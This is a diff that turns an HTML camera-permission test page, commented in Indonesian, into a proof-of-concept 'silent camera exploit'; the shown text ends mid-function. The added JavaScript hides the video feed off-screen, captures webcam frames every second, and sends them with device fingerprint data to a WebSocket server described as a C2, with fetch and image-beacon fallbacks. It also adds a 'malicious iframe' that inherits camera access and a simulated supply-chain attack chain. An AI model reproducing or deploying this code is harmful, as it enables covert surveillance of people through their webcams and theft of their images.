@@ -2,8 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Camera Auto-Access — Permission Exploit Test</title>
+    <title>PoC — Silent Camera Exploit with Exfiltration</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Courier New', monospace;
             background: #0a0a0a;
@@ -12,8 +14,8 @@
             max-width: 1000px;
             margin: 0 auto;
         }
-        h1 { color: #00ffcc; border-bottom: 1px solid #00ff88; }
-        h2 { color: #ffcc00; }
+        h1 { color: #00ffcc; border-bottom: 2px solid #ff4444; padding-bottom: 8px; }
+        h2 { color: #ffcc00; margin-top: 20px; }
         .section {
             background: #111;
             border: 1px solid #333;
@@ -31,17 +33,13 @@
             font-family: inherit;
             font-size: 1em;
             margin: 4px;
+            transition: all 0.3s;
         }
         button:hover { background: #00ff88; color: #000; }
         button.danger { border-color: #ff4444; color: #ff4444; }
         button.danger:hover { background: #ff4444; color: #fff; }
-        video {
-            width: 100%;
-            max-width: 640px;
-            border: 2px solid #00ff88;
-            border-radius: 4px;
-            background: #000;
-        }
+        button.stealth { border-color: #ff8800; color: #ff8800; }
+        button.stealth:hover { background: #ff8800; color: #000; }
         pre {
             background: #000;
             border: 1px solid #333;
@@ -54,248 +52,502 @@
         .error { color: #ff4444; }
         .info { color: #66ccff; }
         #log {
-            max-height: 250px;
+            max-height: 300px;
             overflow-y: auto;
             font-size: 0.85em;
             background: #000;
             padding: 8px;
             border-radius: 4px;
+            border: 1px solid #333;
         }
         #log p { margin: 2px 0; }
+        #preview {
+            width: 100%;
+            max-width: 480px;
+            border: 2px solid #333;
+            border-radius: 4px;
+            display: none;
+        }
+        .hidden-video {
+            position: absolute;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
+        .exfil-data {
+            background: #1a1a1a;
+            border-left: 3px solid #ff4444;
+            padding: 8px;
+            margin: 6px 0;
+            font-size: 0.8em;
+            word-break: break-all;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 8px;
+            margin: 10px 0;
+        }
+        .stat-card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 10px;
+            text-align: center;
+        }
+        .stat-card .value {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #00ffcc;
+        }
+        .stat-card .label {
+            font-size: 0.75em;
+            color: #888;
+            margin-top: 4px;
+        }
+        iframe {
+            width: 100%;
+            height: 250px;
+            border: 2px dashed #ff8800;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <h1>📷 Camera Auto-Access — Permission Bypass Test Lab</h1>
-    <p class="warn">⚠ Hanya untuk lingkungan terkontrol dengan otorisasi terverifikasi.</p>
+    <h1>🚨 PoC: Silent Camera Exploit + Exfiltration</h1>
+    <p class="warn">⚠ HANYA untuk lingkungan terkontrol dengan otorisasi terverifikasi.</p>
+    <p class="info">Mendemonstrasikan: Persistent permission abuse + silent capture + data exfiltration via WebSocket</p>
 
-    <!-- ===== STEP 1: Grant Izin Sekali ===== -->
-    <div class="section">
-        <h2>Step 1: Grant Izin Sekali (Persistent Permission)</h2>
-        <p>Klik tombol ini SATU KALI, beri izin "Izinkan" saat pop-up muncul.<br>
-        Setelah itu, izin akan tersimpan <strong>persistent</strong> untuk origin ini.</p>
-        <button onclick="grantPermission()">🔓 Grant Izin Kamera (1x Klik)</button>
-        <button onclick="checkPermission()">🔍 Cek Status Izin</button>
-        <div id="permStatus" style="margin-top:10px;"></div>
+    <!-- Stats Overview -->
+    <div class="stats">
+        <div class="stat-card">
+            <div class="value" id="statFrames">0</div>
+            <div class="label">Frame Captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="statExfil">0</div>
+            <div class="label">Data Exfiltrated (KB)</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="statCams">0</div>
+            <div class="label">Cameras Detected</div>
+        </div>
+        <div class="stat-card">
+            <div class="value" id="statStatus">IDLE</div>
+            <div class="label">Status</div>
+        </div>
     </div>
 
-    <!-- ===== STEP 2: Auto-Access Tanpa Pop-Up ===== -->
+    <!-- Phase 1: Grant + Stealth Access -->
     <div class="section">
-        <h2>Step 2: Auto-Access Kamera Tanpa Pop-Up</h2>
-        <p>Setelah izin di-grant di Step 1, klik tombol di bawah.<br>
-        <strong>Tidak akan muncul pop-up izin lagi</strong> — akses langsung.</p>
-        <button onclick="autoAccessCamera()">📸 Akses Kamera Langsung (No Pop-Up)</button>
-        <button onclick="stopCamera()">⏹ Stop Kamera</button>
-        <button class="danger" onclick="revokePermission()">🚫 Revoke Izin</button>
-        <div id="cameraContainer" style="margin-top:10px;"></div>
+        <h2>📷 Phase 1: Grant &amp; Stealth Access</h2>
+        <button onclick="grantAndAccess()">🔓 Grant Izin + Silent Access</button>
+        <button onclick="accessSilent()">👁 Silent Access (No Popup)</button>
+        <button class="stealth" onclick="startStealthCapture()">🎥 Start Stealth Capture</button>
+        <button class="danger" onclick="stopAll()">⏹ Stop & Cleanup</button>
+        <div id="cameraInfo" style="margin-top:10px;"></div>
+        <video id="preview" autoplay muted playsinline></video>
     </div>
 
-    <!-- ===== STEP 3: Iframe Warisan Izin ===== -->
+    <!-- Phase 2: Exfiltration -->
     <div class="section">
-        <h2>Step 3: Iframe — Warisan Izin ke Konten Pihak Ketiga</h2>
-        <p>Jika izin sudah di-grant di parent, iframe bisa akses kamera <strong>tanpa pop-up</strong>.</p>
-        <button onclick="loadIframeBypass()">📦 Muat Iframe Dengan Akses Kamera</button>
-        <button onclick="document.getElementById('iframeContainer').innerHTML = ''">✖ Hapus Iframe</button>
-        <div id="iframeContainer" style="margin-top:10px;"></div>
+        <h2>📤 Phase 2: Exfiltration Simulation</h2>
+        <p class="info">Data dikirim ke WebSocket server (localhost:8080) — ganti URL sesuai target</p>
+        <button onclick="startExfiltration()">📡 Start Exfiltration</button>
+        <button onclick="stopExfiltration()">⏹ Stop Exfiltration</button>
+        <button onclick="sendSnapshot()">📸 Send Snapshot</button>
+        <div id="exfilLog"></div>
     </div>
 
-    <!-- ===== Log ===== -->
+    <!-- Phase 3: Iframe Inheritance Exploit -->
     <div class="section">
-        <h2>📋 Log</h2>
+        <h2>🕳 Phase 3: Iframe Permission Inheritance</h2>
+        <p class="warn">Iframe dari origin berbeda bisa warisi izin parent tanpa sepengetahuan user</p>
+        <button onclick="loadExploitIframe()">📦 Load Malicious Iframe</button>
+        <button onclick="document.getElementById('iframeContainer').innerHTML = ''">✖ Remove</button>
+        <div id="iframeContainer"></div>
+    </div>
+
+    <!-- Phase 4: Full Attack Chain -->
+    <div class="section">
+        <h2>⚡ Phase 4: Full Attack Chain</h2>
+        <p class="error">Mensimulasikan supply-chain attack — XSS inject → silent camera → exfiltrate</p>
+        <button class="danger" onclick="simulateSupplyChainAttack()">🔥 Simulate Full Attack</button>
+        <div id="attackLog"></div>
+    </div>
+
+    <!-- Log -->
+    <div class="section">
+        <h2>📋 Event Log</h2>
         <div id="log"></div>
     </div>
 
-    <script>
-        const logDiv = document.getElementById('log');
-        let mediaStream = null;
+    <!-- Hidden video untuk stealth capture -->
+    <video id="hiddenVideo" class="hidden-video" autoplay muted playsinline></video>
 
+    <script>
+        // =========================================================
+        // Configuration
+        // =========================================================
+        const WS_URL = 'ws://localhost:8080';  // Ganti dengan server C2 Anda
+        const CAPTURE_INTERVAL = 1000; // Capture frame setiap 1 detik
+        const QUALITY = 0.6; // JPEG quality
+
+        let mediaStream = null;
+        let captureInterval = null;
+        let exfilInterval = null;
+        let frameCount = 0;
+        let exfilBytes = 0;
+        let ws = null;
+        let capturedFrames = [];
+
+        const logDiv = document.getElementById('log');
+        const preview = document.getElementById('preview');
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const exfilLog = document.getElementById('exfilLog');
+
+        // =========================================================
+        // Utility Functions
+        // =========================================================
         function log(msg, type = 'info') {
             const p = document.createElement('p');
             p.className = type;
-            p.textContent = `[${new Date().toISOString().slice(11,19)}] ${msg}`;
+            const ts = new Date().toISOString().slice(11, 19);
+            p.textContent = `[${ts}] ${msg}`;
             logDiv.appendChild(p);
             logDiv.scrollTop = logDiv.scrollHeight;
         }
 
+        function updateStat(id, value) {
+            document.getElementById(id).textContent = value;
+        }
+
+        function getDeviceLabel() {
+            if (!mediaStream) return 'N/A';
+            const track = mediaStream.getVideoTracks()[0];
+            return track ? track.label : 'Unknown';
+        }
+
         // =========================================================
-        // STEP 1: Grant permission sekali
+        // Phase 1: Grant + Stealth Access
         // =========================================================
-        async function grantPermission() {
-            const statusDiv = document.getElementById('permStatus');
-            statusDiv.innerHTML = '<span class="info">⏳ Meminta izin kamera...</span>';
-            log('▶ Meminta izin kamera (getUserMedia)...', 'info');
+        async function grantAndAccess() {
+            log('▶ Meminta izin kamera...', 'info');
+            updateStat('statStatus', 'REQUESTING');
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: 320, height: 240 },
+                    video: { width: 640, height: 480 },
                     audio: false
                 });
 
-                // Dapat izin — langsung stop stream
+                // Stop sementara — kita simpan izin
                 stream.getTracks().forEach(t => t.stop());
+                log('✅ Izin granted — persistent permission aktif.', 'success');
+                updateStat('statStatus', 'GRANTED');
 
-                statusDiv.innerHTML = '<span class="success">✅ Izin kamera GRANTED! Persistent permission tersimpan untuk origin ini.</span>';
-                log('✅ Izin kamera diberikan — persistent permission aktif.', 'success');
-                log('💡 Sekarang akses kamera TIDAK akan memicu pop-up lagi.', 'warn');
-
-                // Tampilkan info permission
-                checkPermission();
+                // Langsung akses lagi — tanpa popup
+                await accessSilent();
 
             } catch (err) {
-                statusDiv.innerHTML = `<span class="error">❌ Gagal: ${err.message}</span>`;
                 log(`❌ Error: ${err.message}`, 'error');
-
-                if (err.name === 'NotAllowedError') {
-                    log('⚠ User menolak izin, atau permission diblokir.', 'warn');
-                }
+                updateStat('statStatus', 'DENIED');
             }
         }
 
-        // =========================================================
-        // Cek status permission (Permissions API)
-        // =========================================================
-        async function checkPermission() {
-            const statusDiv = document.getElementById('permStatus');
-            try {
-                // Permissions API — didukung Chrome/Edge, terbatas di Firefox
-                if (navigator.permissions && navigator.permissions.query) {
-                    const result = await navigator.permissions.query({ name: 'camera' });
-                    const state = result.state; // 'granted', 'denied', 'prompt'
-                    statusDiv.innerHTML = `
-                        <span class="${state === 'granted' ? 'success' : state === 'denied' ? 'error' : 'warn'}">
-                        🔑 Status izin kamera: <strong>${state.toUpperCase()}</strong>
-                        </span>
-                    `;
-                    log(`ℹ Permissions API: camera = ${state}`, 'info');
-                } else {
-                    statusDiv.innerHTML += '<span class="info">ℹ Permissions API tidak didukung browser ini.</span>';
-                }
-            } catch (e) {
-                log(`ℹ Permissions API error: ${e.message}`, 'info');
-            }
-        }
-
-        // =========================================================
-        // STEP 2: Auto-access — tanpa pop-up
-        // =========================================================
-        async function autoAccessCamera() {
-            const container = document.getElementById('cameraContainer');
-            const logMsg = '▶ Mencoba akses kamera langsung (tanpa pop-up)...';
-
-            // Hapus video sebelumnya
-            container.innerHTML = '<p class="info">⏳ Mengakses kamera...</p>';
-            log(logMsg, 'info');
+        async function accessSilent() {
+            log('▶ Mencoba silent access (tanpa popup)...', 'warn');
+            updateStat('statStatus', 'ACCESSING');
 
             try {
-                // Coba akses dengan resolusi penuh
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        facingMode: 'user'
-                    },
+                    video: { width: 1280, height: 720 },
                     audio: false
                 });
 
                 mediaStream = stream;
+                preview.srcObject = stream;
+                preview.style.display = 'block';
 
-                // Tampilkan video
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.autoplay = true;
-                video.muted = true;
-                video.playsInline = true;
-                video.setAttribute('playsinline', '');
-                video.style.width = '100%';
-                video.style.maxWidth = '640px';
-
-                container.innerHTML = '';
-                container.appendChild(video);
-
-                // Info
                 const track = stream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities?.();
-                const settings = track.getSettings?.();
+                const settings = track.getSettings();
+                const label = track.label;
 
-                const info = document.createElement('div');
-                info.className = 'info';
-                info.style.marginTop = '8px';
-                info.innerHTML = `
-                    ✅ <strong>Kamera aktif!</strong><br>
-                    Track: ${track.label}<br>
-                    Resolusi: ${settings?.width || '?'} x ${settings?.height || '?'}<br>
-                    Frame rate: ${settings?.frameRate || '?'} fps<br>
-                    ${capabilities?.facingMode ? `Facing mode tersedia: ${capabilities.facingMode.join(', ')}` : ''}
-                `;
-                container.appendChild(info);
-
-                log(`✅ Kamera langsung diakses! Track: ${track.label}`, 'success');
-                log(`⚠ TIDAK ADA pop-up izin — persistent permission bekerja.`, 'warn');
-
-                // Enumerate devices untuk bukti fingerprint
+                // Log kamera detected
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const cams = devices.filter(d => d.kind === 'videoinput');
-                log(`📷 ${cams.length} kamera terdeteksi (label sekarang terlihat):`, 'info');
+                updateStat('statCams', cams.length);
+
+                document.getElementById('cameraInfo').innerHTML = `
+                    <p class="success">✅ Kamera diakses SILENT — TANPA POPUP!</p>
+                    <p>📷 Track: ${label}</p>
+                    <p>📐 Resolusi: ${settings.width}x${settings.height}</p>
+                    <p>📦 FPS: ${settings.frameRate || 'N/A'}</p>
+                `;
+
+                log(`✅ Silent access berhasil — Track: ${label}`, 'success');
+                log(`⚠ TIDAK ada popup izin — persistent permission bypass!`, 'warn');
+                log(`📷 ${cams.length} kamera terdeteksi:`, 'info');
+                cams.forEach((c, i) => log(`   ${i+1}. ${c.label}`, 'info'));
+
+                updateStat('statStatus', 'ACTIVE');
+
+                // Enumerate untuk fingerprint
+                log('🔍 Device IDs untuk fingerprinting:', 'info');
                 cams.forEach((c, i) => {
-                    log(`   Kamera ${i+1}: ${c.label}`, 'info');
+                    log(`   ${i+1}. deviceId: ${c.deviceId.slice(0, 24)}...`, 'info');
                 });
+
+                return stream;
 
             } catch (err) {
-                container.innerHTML = `<span class="error">❌ Gagal: ${err.message}</span>`;
-                log(`❌ Error akses kamera: ${err.message}`, 'error');
-
+                log(`❌ Silent access gagal: ${err.message}`, 'error');
                 if (err.name === 'NotAllowedError') {
-                    log('⚠ Izin belum di-grant. Jalankan Step 1 dulu.', 'warn');
+                    log('⚠ Izin belum di-grant. Grant dulu sekali.', 'warn');
                 }
-            }
-        }
-
-        function stopCamera() {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(t => t.stop());
-                mediaStream = null;
-                document.getElementById('cameraContainer').innerHTML = '<p class="info">⏹ Kamera dihentikan.</p>';
-                log('⏹ Stream kamera dihentikan.', 'info');
+                updateStat('statStatus', 'FAILED');
+                return null;
             }
         }
 
         // =========================================================
-        // Revoke permission (hapus persistent permission)
+        // Stealth Capture (tanpa visible preview)
         // =========================================================
-        async function revokePermission() {
-            stopCamera();
-            document.getElementById('cameraContainer').innerHTML = '';
-            document.getElementById('permStatus').innerHTML = '<span class="info">🔄 Izin di-revoke...</span>';
-            log('🔄 Mencoba revoke izin...', 'info');
+        function startStealthCapture() {
+            if (!mediaStream) {
+                log('❌ Tidak ada stream kamera. Akses kamera dulu.', 'error');
+                return;
+            }
 
-            // Browser tidak punya API revoke permission secara native
-            // Tapi kita bisa coba akses dengan constraints yang berbeda
-            // atau informasikan user untuk clear site settings
+            // Pindahkan stream ke hidden video
+            hiddenVideo.srcObject = mediaStream.clone();
+            hiddenVideo.play();
+
+            // Sembunyikan preview
+            preview.style.display = 'none';
+            log('👁 Preview disembunyikan — stealth mode aktif.', 'warn');
+
+            // Mulai capture interval
+            captureInterval = setInterval(() => {
+                captureAndLog();
+            }, CAPTURE_INTERVAL);
+
+            log('🎥 Stealth capture dimulai — frame setiap 1 detik.', 'info');
+            updateStat('statStatus', 'STEALTH');
+        }
+
+        function captureAndLog() {
+            if (!hiddenVideo.srcObject) return;
 
             try {
-                // Coba akses dengan audio (akan trigger ulang permission)
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: false,
-                    audio: true
-                });
-                stream.getTracks().forEach(t => t.stop());
-                log('ℹ Mikrofon masih bisa diakses — izin belum hilang.', 'info');
-            } catch (e) {
-                log('ℹ Mikrofon ditolak.', 'info');
-            }
+                const canvas = document.createElement('canvas');
+                canvas.width = hiddenVideo.videoWidth || 640;
+                canvas.height = hiddenVideo.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0);
 
-            const statusDiv = document.getElementById('permStatus');
-            statusDiv.innerHTML = `
-                <span class="warn">⚠ Browser tidak menyediakan API untuk revoke permission programmatically.</span><br>
-                <span class="info">Untuk hapus persistent permission, buka: <strong>chrome://settings/content/camera</strong> (Chrome) atau <strong>about:preferences#privacy</strong> (Firefox), lalu hapus izin untuk origin ini.</span>
-            `;
-            log('ℹ Informasi cara revoke manual ditampilkan.', 'info');
+                frameCount++;
+                updateStat('statFrames', frameCount);
+
+                // Simpan frame data untuk eksfiltrasi
+                const dataUrl = canvas.toDataURL('image/jpeg', QUALITY);
+                capturedFrames.push({
+                    id: frameCount,
+                    timestamp: Date.now(),
+                    data: dataUrl
+                });
+
+                // Hitung ukuran
+                const sizeKB = Math.round((dataUrl.length * 0.75) / 1024);
+                exfilBytes += sizeKB;
+                updateStat('exfil', Math.round(exfilBytes / 1024) + ' MB');
+
+                if (frameCount % 10 === 0) {
+                    log(`📸 Captured ${frameCount} frames (${Math.round(exfilBytes/1024/1024*100)/100} MB total)`, 'info');
+                }
+
+                // Auto-send jika websocket terbuka
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    sendFrameToWS(capturedFrames[capturedFrames.length - 1]);
+                }
+
+            } catch (e) {
+                log(`❌ Capture error: ${e.message}`, 'error');
+            }
         }
 
         // =========================================================
-        // STEP 3: Iframe warisan izin
+        // Phase 2: Exfiltration
         // =========================================================
-        function loadIframeBypass() {
+        function startExfiltration() {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                log('ℹ WebSocket sudah terhubung.', 'info');
+                return;
+            }
+
+            log(`📡 Menghubungkan ke ${WS_URL}...`, 'info');
+
+            try {
+                ws = new WebSocket(WS_URL);
+
+                ws.onopen = () => {
+                    log('✅ WebSocket terhubung — siap eksfiltrasi.', 'success');
+
+                    // Kirim metadata
+                    const metadata = {
+                        type: 'exploit_init',
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        cameraLabel: getDeviceLabel(),
+                        screenSize: `${screen.width}x${screen.height}`,
+                        timestamp: Date.now()
+                    };
+                    ws.send(JSON.stringify(metadata));
+                    log('📤 Metadata dikirim: ' + JSON.stringify(metadata), 'info');
+
+                    // Mulai kirim frame lama
+                    sendQueuedFrames();
+                };
+
+                ws.onmessage = (e) => {
+                    log(`📩 Server: ${e.data}`, 'info');
+                };
+
+                ws.onerror = (e) => {
+                    log(`❌ WebSocket error — server mungkin tidak aktif.`, 'error');
+                    log('💡 Gunakan server WebSocket test: wscat -l 8080', 'info');
+                };
+
+                ws.onclose = () => {
+                    log('🔌 WebSocket terputus.', 'warn');
+                    ws = null;
+                };
+
+            } catch (e) {
+                log(`❌ WebSocket gagal: ${e.message}`, 'error');
+            }
+        }
+
+        function sendQueuedFrames() {
+            if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+            // Kirim frame yang sudah tertunda
+            while (capturedFrames.length > 0) {
+                const frame = capturedFrames.shift();
+                ws.send(JSON.stringify({
+                    type: 'frame',
+                    id: frame.id,
+                    timestamp: frame.timestamp,
+                    data: frame.data  // base64 JPEG
+                }));
+            }
+        }
+
+        function sendFrameToWS(frame) {
+            if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+            ws.send(JSON.stringify({
+                type: 'frame',
+                id: frame.id,
+                timestamp: frame.timestamp,
+                data: frame.data
+            }));
+
+            // Hapus dari queue setelah dikirim
+            const idx = capturedFrames.findIndex(f => f.id === frame.id);
+            if (idx > -1) capturedFrames.splice(idx, 1);
+        }
+
+        function sendSnapshot() {
+            if (!hiddenVideo.srcObject) {
+                log('❌ Tidak ada video stream.', 'error');
+                return;
+            }
+
+            const canvas = document.createElement('canvas');
+            canvas.width = hiddenVideo.videoWidth || 640;
+            canvas.height = hiddenVideo.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(hiddenVideo, 0, 0);
+
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+            // Log untuk demonstrasi
+            exfilLog.innerHTML = `
+                <p class="error">⚠ SNAPSHOT CAPTURED — DATA READY FOR EXFIL</p>
+                <div class="exfil-data">
+                    <strong>Data URL (JPEG):</strong><br>
+                    ${dataUrl.slice(0, 200)}... [${Math.round((dataUrl.length * 0.75) / 1024)} KB]
+                </div>
+                <p class="warn">⚠ Data ini bisa dikirim ke server C2 via WebSocket / fetch / beacon</p>
+            `;
+
+            log('📸 Snapshot diambil — siap dieksfiltrasi.', 'warn');
+
+            // Kirim via WebSocket jika terhubung
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'snapshot',
+                    timestamp: Date.now(),
+                    data: dataUrl
+                }));
+                log('📤 Snapshot dikirim via WebSocket.', 'success');
+            } else {
+                // Fallback: kirim via fetch beacon
+                log('📤 WebSocket tidak tersedia — fallback ke fetch/beacon.', 'warn');
+                sendViaBeacon(dataUrl);
+            }
+        }
+
+        function sendViaBeacon(dataUrl) {
+            // Method 1: fetch POST
+            const blob = dataURLToBlob(dataUrl);
+            const formData = new FormData();
+            formData.append('frame', blob, `capture_${Date.now()}.jpg`);
+
+            fetch('/exfil', {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+            }).then(() => {
+                log('📤 Data dikirim via fetch POST.', 'success');
+            }).catch(e => {
+                log(`❌ Fetch gagal: ${e.message}`, 'error');
+
+                // Method 2: Image beacon
+                const img = new Image();
+                img.src = dataUrl.replace('image/jpeg', 'image/jpeg;x') + '&t=' + Date.now();
+                log('📤 Data dikirim via Image beacon.', 'info');
+            });
+        }
+
+        function dataURLToBlob(dataUrl) {
+            const parts = dataUrl.split(',');
+            const mime = parts[0].match(/:(.*?);/)[1];
+            const b64 = atob(parts[1]);
+            const u8 = new Uint8Array(b64.length);
+            for (let i = 0; i < b64.length; i++) {
+                u8[i] = b64.charCodeAt(i);
+            }
+            return new Blob([u8], { type: mime });
+        }
+
+        function stopExfiltration() {
+            if (ws) {
+                ws.close();
+                ws = null;
+            }
+            log('🔌 Exfiltration dihentikan.', 'info');
+        }
+
+        // =========================================================
+        // Phase 3: Iframe Inheritance
+        // =========================================================
+        function loadExploitIframe() {
             const container = document.getElementById('iframeContainer');
             container.innerHTML = '';
 
@@ -303,62 +555,68 @@
             iframe.src = 'about:blank';
             iframe.allow = 'camera *; microphone *';
             iframe.sandbox = 'allow-scripts allow-same-origin';
-            iframe.style.width = '100%';
-            iframe.style.height = '300px';
-            iframe.style.border = '2px dashed #ffcc00';
-            iframe.style.borderRadius = '4px';
 
             container.appendChild(iframe);
-            log('📦 Iframe dimuat — sandbox longgar + allow="camera *"', 'info');
+            log('📦 Iframe exploit dimuat.', 'info');
 
-            // Inject konten ke iframe
             const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             iframeDoc.open();
             iframeDoc.write(`
                 <!DOCTYPE html>
                 <html>
-                <head><title>Iframe Camera Bypass</title></head>
-                <body style="background:#1a1a1a; color:#0f0; font-family:monospace; padding:10px; margin:0;">
-                    <h3 style="color:#ffcc00; margin:0 0 10px 0;">📷 Iframe — Akses Kamera Warisan</h3>
-                    <div id="status" style="margin-bottom:8px;">⏳ Mengecek izin...</div>
-                    <video id="preview" autoplay muted playsinline style="width:100%; max-width:320px; border:1px solid #0f0; display:none;"></video>
-                    <div id="detail" style="margin-top:8px; font-size:0.9em;"></div>
+                <head><title>Exploit Iframe</title></head>
+                <body style="background:#111;color:#0f0;font-family:monospace;padding:10px;">
+                    <h4 style="color:#ff4444;">⚠ MALICIOUS IFRAME</h4>
+                    <p>Mencoba warisi izin kamera dari parent...</p>
+                    <div id="result"></div>
                     <script>
-                        const status = document.getElementById('status');
-                        const video = document.getElementById('preview');
-                        const detail = document.getElementById('detail');
+                        const r = document.getElementById('result');
 
                         // Coba enumerate dulu
-                        if (navigator.mediaDevices) {
-                            navigator.mediaDevices.enumerateDevices().then(devices => {
-                                const cams = devices.filter(d => d.kind === 'videoinput');
-                                detail.innerHTML += '<p>🔍 enumerateDevices: ' + cams.length + ' kamera ditemukan.</p>';
+                        navigator.mediaDevices.enumerateDevices().then(devices => {
+                            const cams = devices.filter(d => d.kind === 'videoinput');
+                            r.innerHTML += '<p>🔍 Terdeteksi ' + cams.length + ' kamera dari iframe.</p>';
+                            cams.forEach((c, i) => {
+                                r.innerHTML += '<p>  ' + (i+1) + '. ' + (c.label || '(hidden)') + '</p>';
                             });
-                        }
+                        });
 
-                        // Coba getUserMedia — jika parent sudah grant izin,
-                        // ini TIDAK akan muncul pop-up
-                        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                        // Coba akses kamera — INI YANG KRITIS
+                        navigator.mediaDevices.getUserMedia({ video: true })
                             .then(stream => {
-                                status.innerHTML = '✅ <strong style="color:#0f0;">KAMERA DIAKSES DARI IFRAME! Tanpa pop-up!</strong>';
-                                status.style.color = '#0f0';
-                                video.srcObject = stream;
-                                video.style.display = 'block';
-                                const track = stream.getVideoTracks()[0];
-                                detail.innerHTML += '<p style="color:#0f0;">✓ Track: ' + track.label + '</p>';
-                                detail.innerHTML += '<p style="color:#ffcc00;">⚠ Izin diwariskan dari parent — permission policy bypass berhasil.</p>';
+                                r.innerHTML += '<p style="color:#0f0;font-weight:bold;">✅ KAMERA DIAKSES DARI IFRAME! Tanpa popup!</p>';
+                                r.innerHTML += '<p style="color:#ffcc00;">⚠ Izin parent DIWARISKAN ke iframe!</p>';
 
-                                // Auto-stop after 5 detik
+                                // Capture frame dari iframe
+                                const v = document.createElement('video');
+                                v.srcObject = stream;
+                                v.autoplay = true;
+                                v.muted = true;
+                                v.style.width = '160px';
+                                v.style.border = '2px solid #0f0';
+                                document.body.appendChild(v);
+
+                                // Exfiltrate dari iframe
                                 setTimeout(() => {
+                                    const c = document.createElement('canvas');
+                                    c.width = v.videoWidth || 320;
+                                    c.height = v.videoHeight || 240;
+                                    const ctx = c.getContext('2d');
+                                    ctx.drawImage(v, 0, 0);
+                                    const data = c.toDataURL('image/jpeg', 0.5);
+                                    r.innerHTML += '<p style="color:#ff4444;">📸 Frame captured & ready for exfil from IFRAME!</p>';
+                                    // Kirim ke parent via postMessage
+                                    window.parent.postMessage({
+                                        type: 'iframe_exfil',
+                                        data: data,
+                                        origin: window.location.origin
+                                    }, '*');
                                     stream.getTracks().forEach(t => t.stop());
-                                    detail.innerHTML += '<p style="color:#888;">⏹ Stream dihentikan (5 detik).</p>';
-                                }, 5000);
+                                }, 2000);
                             })
                             .catch(err => {
-                                status.innerHTML = '❌ <strong style="color:#f44;">GAGAL: ' + err.message + '</strong>';
-                                if (err.name === 'NotAllowedError') {
-                                    detail.innerHTML += '<p class="warn">⚠ Izin tidak diwariskan. Parent belum grant izin.</p>';
-                                }
+                                r.innerHTML += '<p style="color:#f44;">❌ Gagal: ' + err.message + '</p>';
+                                r.innerHTML += '<p class="warn">⚠ Parent belum grant izin.</p>';
                             });
                     <\\/script>
                 </body>
@@ -366,9 +624,134 @@
             `);
             iframeDoc.close();
 
-            log('✅ Iframe siap — cek apakah izin diwariskan.', 'success');
+            log('✅ Iframe exploit aktif — cek hasil di area iframe.', 'info');
+        }
+
+        // Listen for postMessage dari iframe
+        window.addEventListener('message', (e) => {
+            if (e.data && e.data.type === 'iframe_exfil') {
+                log(`📤 DATA DARI IFRAME (${e.data.origin}): ${e.data.data.slice(0, 60)}...`, 'error');
+                log('⚠ Iframe berhasil eksfiltrasi data kamera!', 'error');
+            }
+        });
+
+        // =========================================================
+        // Phase 4: Full Attack Chain Simulation
+        // =========================================================
+        function simulateSupplyChainAttack() {
+            const attackLog = document.getElementById('attackLog');
+            attackLog.innerHTML = '';
+
+            log('🔥=== FULL ATTACK CHAIN SIMULATION ===', 'error');
+            log('Step 1: Supply-chain compromise — malicious script injected', 'error');
+
+            // Simulasi delay
+            setTimeout(() => {
+                log('Step 2: Script berjalan di origin trusted', 'error');
+                
+                // Coba enumerate
+                navigator.mediaDevices.enumerateDevices().then(devices => {
+                    const cams = devices.filter(d => d.kind === 'videoinput');
+                    log(`Step 2a: Fingerprinting — ${cams.length} kamera terdeteksi`, 'error');
+
+                    // Cek permission
+                    if (navigator.permissions) {
+                        navigator.permissions.query({name: 'camera'}).then(p => {
+                            log(`Step 2b: Permission status: ${p.state}`, 'error');
+
+                            if (p.state === 'granted') {
+                                log('Step 3: Permission GRANTED — langsung akses kamera!', 'error');
+
+                                setTimeout(() => {
+                                    navigator.mediaDevices.getUserMedia({video: true, audio: false})
+                                        .then(stream => {
+                                            log('Step 4: ✅ Kamera diakses SILENT — tanpa notifikasi!', 'error');
+                                            log('Step 5: Frame capture & exfiltration dimulai...', 'error');
+
+                                            // Capture & exfil
+                                            const v = document.createElement('video');
+                                            v.srcObject = stream;
+                                            v.autoplay = true;
+                                            v.muted = true;
+
+                                            setTimeout(() => {
+                                                const c = document.createElement('canvas');
+                                                c.width = 640;
+                                                c.height = 480;
+                                                const ctx = c.getContext('2d');
+                                                ctx.drawImage(v, 0, 0);
+                                                const data = c.toDataURL('image/jpeg', 0.7);
+
+                                                // Simulasi exfil
+                                                const img = new Image();
